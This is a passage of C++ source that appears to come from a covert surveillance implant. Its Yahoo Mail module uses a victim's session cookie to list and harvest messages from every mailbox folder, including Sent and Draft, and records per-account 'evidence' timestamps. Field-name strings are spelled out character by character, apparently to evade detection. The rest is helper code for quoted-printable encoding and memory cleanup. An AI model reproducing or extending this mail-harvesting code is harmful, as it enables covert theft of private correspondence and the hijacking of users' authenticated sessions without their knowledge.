	znfree((LPVOID*)&pFields->strEmail);
	znfree((LPVOID*)&pFields->strName);
	znfree((LPVOID*)&pFields->strPhone);

	return SOCIAL_REQUEST_SUCCESS;
}

//structure memory deallocation
DWORD YHFreeMailFields(LPYAHOO_MAIL_FIELDS pYHMailFields)
{	
	znfree((LPVOID*)&pYHMailFields->strDisposition);
	znfree((LPVOID*)&pYHMailFields->strEncoding);
	znfree((LPVOID*)&pYHMailFields->strFilename);
	znfree((LPVOID*)&pYHMailFields->strPartId);
	znfree((LPVOID*)&pYHMailFields->strSubType);
	znfree((LPVOID*)&pYHMailFields->strText);
	znfree((LPVOID*)&pYHMailFields->strTypeParams);
	znfree((LPVOID*)&pYHMailFields->strType);

	return SOCIAL_REQUEST_SUCCESS;
}


//structure memory deallocation
DWORD YHFreeConnectionParams(LPYAHOO_CONNECTION_PARAMS pYHParams)
{
	znfree((LPVOID*)&pYHParams->strMailFolder);
	znfree((LPVOID*)&pYHParams->strServerName);
	znfree((LPVOID*)&pYHParams->strWSSID);
	znfree((LPVOID*)&pYHParams->strNeoGUID);
	znfree((LPVOID*)&pYHParams->strUUID); 
	znfree((LPVOID*)&pYHParams->strRndValue);

	return SOCIAL_REQUEST_SUCCESS;
}

DWORD YahooMessageHandler(LPSTR strCookie)
{
	if (!ConfIsModuleEnabled(L"messages"))
		return SOCIAL_REQUEST_SUCCESS;

	//json params
	std::vector<int>::size_type iItem;
	JSONValue*  jValue = NULL;
	JSONObject	jObj;
	JSONArray	jFolders;
	WCHAR strFidFld[]			= { L'f', L'i', L'd', L'\0' };
	WCHAR strFolderFld[]		= { L'f', L'o', L'l', L'd', L'e', L'r', L'\0' };
	WCHAR strFolderInfoFld[]	= { L'f', L'o', L'l', L'd', 'e', L'r', L'I', L'n', 'f', L'o', L'\0' };	
	WCHAR strNameFld[]			= { L'n', L'a', L'm', L'e', L'\0' };	
	WCHAR strRoot[]				= { L'r', L'e', L's', L'u', L'l', L't', L'\0' };

	YAHOO_CONNECTION_PARAMS YHParams;
	LPSTR	strFolderName = NULL;
	DWORD	dwLen = 0;
	size_t	dwSize;
	BOOL	bIncoming, bDraft;
	
	SecureZeroMemory(&YHParams, sizeof(YHParams));
	
	//get connection parameters used in later queries
	DWORD dwRet = YHGetConnectionParams(&YHParams, strCookie);
	if (dwRet != SOCIAL_REQUEST_SUCCESS)
		return dwRet;

	//get the mail folder names
	dwRet = YHGetFoldersName(&jValue, &YHParams, strCookie);
	if(dwRet != SOCIAL_REQUEST_SUCCESS)
	{	
		YHFreeConnectionParams(&YHParams);
		return dwRet;
	}

	//json tree of mail folders
	if ((jValue != NULL) && (jValue)->IsObject())
	{
		jObj = (jValue)->AsObject(); //json root

		//find the result object
		if (jObj.find(strRoot) != jObj.end() && jObj[strRoot]->IsObject())
		{	
			jObj = jObj[strRoot]->AsObject();

			if (jObj[strFolderFld]->IsArray())
			{
				//folder array
				jFolders = jObj[strFolderFld]->AsArray();
			}
		}
	}
	else
	{	//if the json is not an obj or it's null, return an error
		delete jValue;

		return SOCIAL_REQUEST_BAD_COOKIE;
	}

	//loop to retrieve mails in every folder	
	for(iItem=0; iItem<jFolders.size(); iItem++)
	{
		if(!jFolders[iItem]->IsObject())
			continue;

		//folder[iItem] object
		jObj = jFolders[iItem]->AsObject();

		if(!jObj[strFolderInfoFld]->IsObject())
			continue;

		//folderInfo object
		jObj = jObj[strFolderInfoFld]->AsObject();
		
		//yhfix
		if(!jObj[strFidFld]->IsString())
			continue;

		//convert folder name to LPSTR
		dwLen = wcslen(jObj[strFidFld]->AsString().c_str()) + 1;
		strFolderName = (LPSTR)zalloc(dwLen);
		if(strFolderName == NULL)
		{
			YHFreeConnectionParams(&YHParams);
			delete jValue;

			return SOCIAL_REQUEST_BAD_COOKIE;
		}
		wcstombs_s(&dwSize, strFolderName, dwLen, jObj[strFidFld]->AsString().c_str(), _TRUNCATE);
		
		bIncoming = TRUE;
		bDraft	  = FALSE;

		if(!_stricmp(strFolderName, "Sent"))
			bIncoming = FALSE;		
		else if(!_stricmp(strFolderName, "Draft"))
		{
			bDraft		= TRUE;
			bIncoming	= FALSE;
		}

		//parse mail folder
		if(YHParseMailBox(strFolderName, strCookie, &YHParams, bIncoming, bDraft) == YAHOO_ALLOC_ERROR)
			iItem = jFolders.size() + 1; //exit from the loop

		//free heap
		znfree((LPVOID*)&strFolderName);
	}

	//delete json parsed value
	delete jValue;

	//free connection params
	YHFreeConnectionParams(&YHParams);

	return SOCIAL_REQUEST_SUCCESS;
}


//ascii char to unicode conversion (utf-8)
void AsciiCharToQP(WCHAR ch, LPWSTR lpOutBuf)
{
	WCHAR ch0, ch1;
	DWORD dwLen=0, i;

	if(ch == 0)
		return;
	
	//if it's > 0xFF, convert it to a mb array
	if(ch > 0xFF)
	{
		WCHAR strBuf[16];
		char  strTmpBuf[4];

		dwLen = WideCharToMultiByte(CP_UTF8, 0, &ch, 1, strTmpBuf, 4, 0, 0);		

		*lpOutBuf = 0;
		for(i=0; i<dwLen; i++)
		{	
			ch0 = strTmpBuf[i] & 0xFF;
			swprintf_s(strBuf, 16, L"=%02X", ch0);
			wmemcpy_s(&lpOutBuf[i*3], 16, strBuf, 3);
		}
		lpOutBuf[i*3] = 0;

		return;
	}

	if(ch > 0x7F)
	{
		//AND char with 00111111 and OR the result with 10000000
		ch0 = (ch & 0x3F) | 0x80;
		//shift byte, AND it with 00000011 and OR the result with 11000000
		ch1 = ((ch >> 6) & 0x03) | 0xC0;
		swprintf_s(lpOutBuf+dwLen, 16, L"=%02X=%02X", ch1, ch0);

	}
	else
	{
		swprintf_s(lpOutBuf+dwLen, 16, L"=%02X", ch);
	}
}

/*
void AsciiCharToQP(CHAR ch, LPSTR lpOutBuf)
{
	CHAR ch0, ch1;

	if(ch == 0)
		return;

	if(ch > 0x7F)
	{
		//AND char with 00111111 and OR the result with 10000000
		ch0 = (ch & 0x3F) | 0x80;
		//shift byte, AND it with 00000011 and OR the result with 11000000
		ch1 = ((ch >> 6) & 0x03) | 0xC0;
		sprintf_s(lpOutBuf, 16, "=%02X=%02X", ch1, ch0);
	}
	else
	{
		sprintf_s(lpOutBuf, 16, "=%02X", ch);
	}

}

BOOL IsEOL(CHAR* pBuf)
{
	if ((pBuf[0] == '\r') && (pBuf[1] == '\n'))
		return TRUE;

	return FALSE;
}
*/


//check if the char is a \n char
BOOL IsEOL(WCHAR* pBuf)
{
	if ((pBuf[0] == '\r') && (pBuf[1] == '\n'))
		return TRUE;

	return FALSE;
}

/*
//ascii buffer to quoted printable conversion
DWORD AsciiBufToQP(LPWSTR lpBuffer, DWORD dwSize, LPWSTR* lpUTFBuf)
{		
	LPSTR strMB=NULL, strTmpDest=NULL;
	CHAR  strUTF[16];
	CHAR ch;
	DWORD i, dwNewSize, dwWR, j, dwLen, dwLine;
	BOOL bEOL = FALSE;

	//convertion to UTF charset
	if(ConvertToUTF8(lpBuffer, &strMB) != YAHOO_SUCCESS)
		return YAHOO_ERROR;

	dwNewSize = dwSize+256;

	//alloc a new buffer 256 byte bigger than the original
	strTmpDest = (LPSTR)zalloc(dwNewSize);
	if(strTmpDest == NULL)
	{
		znfree((LPVOID*)&strMB);
		return YAHOO_ALLOC_ERROR;
	}

	SecureZeroMemory(strTmpDest, dwNewSize);

	//conversion loop
	for(dwLine=0, dwWR=0, i=0; i<dwSize; i++)
	{
		ch = strMB[i];

		if(IsEOL(&strMB[i+1]))
			bEOL = TRUE;
		else
			bEOL = FALSE;

		if(ConvertChar(ch, bEOL))
		{
			AsciiCharToQP(strMB[i], strUTF);
		}
		else
		{	
			sprintf_s(strUTF, 8, "%c", ch);
		}

		//dwWR += wcslen(strUTF);
		dwLen = strlen(strUTF);

		if ((dwWR + dwLen) >= dwNewSize)
		{			
			strTmpDest = (LPSTR)realloc(strTmpDest, (dwNewSize+256));
			if(strTmpDest == NULL)
			{
				znfree((LPVOID*)&strMB);
				return YAHOO_ALLOC_ERROR;
			}
			strTmpDest[dwWR+dwLen] = 0;

			dwNewSize += 256;
		}

		//wcscat(*lpUTFBuf, strUTF);

		//copy chars to the new buffer and adds a "=\r\n" if the line exceeds 75 chars
		for (j=0; strUTF[j] != 0; j++)
		{
			if ((dwLine == 73) && (dwWR > 0))
			{
				//if it's an encoded char, then write it exceeding the fixed length
				if(dwLen > 1)
				{
					memcpy(&strTmpDest[dwWR], &strUTF[j], ((dwLen-j)*sizeof(WCHAR)));
					dwWR += (dwLen-j);
					strTmpDest[dwWR++] = L'=';
					strTmpDest[dwWR++] = L'\r';
					strTmpDest[dwWR++] = L'\n';

					dwLine = 0;
					break;
				}
				else
				{
					strTmpDest[dwWR++] = L'=';
					strTmpDest[dwWR++] = L'\r';
					strTmpDest[dwWR++] = L'\n';
					strTmpDest[dwWR++] = strUTF[j];
				}

				dwLine = 0;
			}
			else
				strTmpDest[dwWR++] = strUTF[j];

			dwLine++;
		}
	}
	znfree((LPVOID*)&strMB);

	//null terminate the buffer
	strTmpDest[dwWR++] = 0;

	//convert from multibyte to wide char
	dwSize = MultiByteToWideChar(CP_UTF8, 0, strTmpDest, -1, *lpUTFBuf, 0);
	
	//alloc required WCHARS	
	*lpUTFBuf = (LPWSTR)zalloc(dwSize*sizeof(WCHAR));
	if(*lpUTFBuf == NULL)
	{	
		znfree((LPVOID*)&strTmpDest);
		return YAHOO_ALLOC_ERROR;
	}

	MultiByteToWideChar(CP_UTF8, 0, strTmpDest, -1, *lpUTFBuf, dwSize);

	//free heap
	znfree((LPVOID*)&strTmpDest);

	return YAHOO_SUCCESS;
}
*/


//ascii buffer to quoted printable conversion
DWORD AsciiBufToQP(LPWSTR lpBuffer, DWORD dwSize, LPWSTR* lpUTFBuf)
{	
	LPWSTR pOldBuf = NULL;
	LPSTR strMB=NULL, strTmpDest=NULL;
	WCHAR strUTF[16];
	WCHAR ch;
	DWORD i, dwNewSize, dwWR, j, dwLen, dwLine;
	BOOL bEOL = FALSE;

	dwNewSize = dwSize + YAHOO_ALLOC_SIZE;

	//alloc a new buffer 512 byte bigger than the original
	*lpUTFBuf = (LPWSTR)zalloc(dwNewSize*sizeof(WCHAR));
	if(*lpUTFBuf == NULL)
		return YAHOO_ALLOC_ERROR;

	SecureZeroMemory(*lpUTFBuf, dwNewSize);

	//conversion loop
	for(dwLine=0, dwWR=0, i=0; i<dwSize; i++)
	{
		ch = lpBuffer[i];

		if(IsEOL(&lpBuffer[i+1]))
			bEOL = TRUE;
		else
			bEOL = FALSE;

		if(ConvertChar(ch, bEOL))
		{
			memset(strUTF, 0, sizeof(strUTF));
			AsciiCharToQP(ch, strUTF);
		}
		else
		{	
			swprintf_s(strUTF, 8, L"%c", ch);
		}

		//dwWR += wcslen(strUTF);
		dwLen = wcslen(strUTF);

		if ((dwWR + dwLen + 6) >= dwNewSize)
		{	
			pOldBuf = *lpUTFBuf;
			*lpUTFBuf = (LPWSTR)realloc(*lpUTFBuf, (dwNewSize+YAHOO_ALLOC_SIZE) * sizeof(WCHAR));
			if(*lpUTFBuf == NULL)
			{
				znfree((LPVOID*)&pOldBuf);
				return YAHOO_ALLOC_ERROR;
			}
			*((*lpUTFBuf)+dwWR+dwLen) = 0;

			dwNewSize += YAHOO_ALLOC_SIZE;
		}

		//wcscat(*lpUTFBuf, strUTF);

		//copy chars to the new buffer and adds a "=\r\n" if the line exceeds 75 chars
		for (j=0; strUTF[j] != 0; j++)
		{
			if ((dwLine == 73) && (dwWR > 0))
			{
				//if it's an encoded char, then write it exceeding the fixed length
				if(dwLen > 1)
				{
					memcpy((*lpUTFBuf)+(dwWR), &strUTF[j], ((dwLen-j)*sizeof(WCHAR)));
					dwWR += (dwLen-j);
					*((*lpUTFBuf)+(dwWR++)) = L'=';
					*((*lpUTFBuf)+(dwWR++)) = L'\r';
					*((*lpUTFBuf)+(dwWR++)) = L'\n';

					dwLine = 0;
					break;
				}
				else
				{
					*((*lpUTFBuf)+(dwWR++)) = L'=';
					*((*lpUTFBuf)+(dwWR++)) = L'\r';
					*((*lpUTFBuf)+(dwWR++)) = L'\n';
					*((*lpUTFBuf)+(dwWR++)) = strUTF[j];
				}

				dwLine = 0;
			}
			else
				*((*lpUTFBuf)+(dwWR++)) = strUTF[j];

			dwLine++;
		}
	}

	//null terminate the buffer
	*((*lpUTFBuf)+(dwWR)) = 0;

	return YAHOO_SUCCESS;
}

//verify if che char must be converted to utf
BOOL ConvertChar(WCHAR ch, BOOL bEOL)
{
	WCHAR chTable1[] = L"\t\r\n=";	//to be encoded
	WCHAR chTable2[] = L"\t =";		//to be encoded only if the char is the last of the line
	DWORD i;
	
	if(ch > 0x7F)
		return TRUE;

	if(bEOL == FALSE)
	{
		for(i=0; i<wcslen(chTable1); i++)
		{
			if(ch == chTable1[i])
				return TRUE;
		}
	}

	if(bEOL == TRUE)
	{
		for(i=0; i<wcslen(chTable2); i++)
		{
			if(ch == chTable2[i])
				return TRUE;
		}
	}

	return FALSE;
}

/*
//verify if che char must be converted to utf
BOOL ConvertChar(CHAR ch, BOOL bEOL)
{
	CHAR chTable1[] = "\t\r\n=";	//to be encoded
	CHAR chTable2[] = "\t =";		//to be encoded only if the char is the last of the line
	DWORD i;
	
	if(ch > 0x7F)
		return TRUE;

	if(bEOL == FALSE)
	{
		for(i=0; i<strlen(chTable1); i++)
		{
			if(ch == chTable1[i])
				return TRUE;
		}
	}

	if(bEOL == TRUE)
	{
		for(i=0; i<strlen(chTable2); i++)
		{
			if(ch == chTable2[i])
				return TRUE;
		}
	}

	return FALSE;
}
*/

//get the last timestamp used for the requested evidence type
DWORD YHGetLastTimeStamp(LPYAHOO_CONNECTION_PARAMS pYHParams, LPSTR pstrSuffix)
{
	char	strTSName[64];
	char	*pEnc = NULL;
	size_t	dwSize;	

	//wchar to multibyte
	wcstombs_s(&dwSize, strTSName, sizeof(strTSName), pYHParams->strNeoGUID, _TRUNCATE);

	//encode the suffix
	pEnc = base64_encode((const unsigned char*)pstrSuffix, strlen(pstrSuffix));
	if(pEnc == NULL)
		return YAHOO_ALLOC_ERROR;

	//add the suffix
	strcat_s(strTSName, sizeof(strTSName), pEnc);

	//free heap
	znfree((LPVOID*)&pEnc);

	//get last timestamp saved
	pYHParams->dwLowTS = SocialGetLastTimestamp(strTSName, &pYHParams->dwHighTS);

	return YAHOO_SUCCESS;
}


//set the last timestamp used for the requested evidence type
DWORD YHSetLastTimeStamp(LPYAHOO_CONNECTION_PARAMS pYHParams, LPSTR pstrSuffix)
{
	char	strTSName[64];
	char	*pEnc = NULL;
	size_t	dwSize;	

	//wchar to multibyte
	wcstombs_s(&dwSize, strTSName, sizeof(strTSName), pYHParams->strNeoGUID, _TRUNCATE);

	//encode the suffix
	pEnc = base64_encode((const unsigned char*)pstrSuffix, strlen(pstrSuffix));
	if(pEnc == NULL)
		return YAHOO_ALLOC_ERROR;

	//add a suffix
	strcat_s(strTSName, sizeof(strTSName), pEnc);
	
	znfree((LPVOID*)&pEnc);

	//get last timestamp saved	
	SocialSetLastTimestamp(strTSName, pYHParams->dwLowTS, pYHParams->dwHighTS);

	return YAHOO_SUCCESS;
}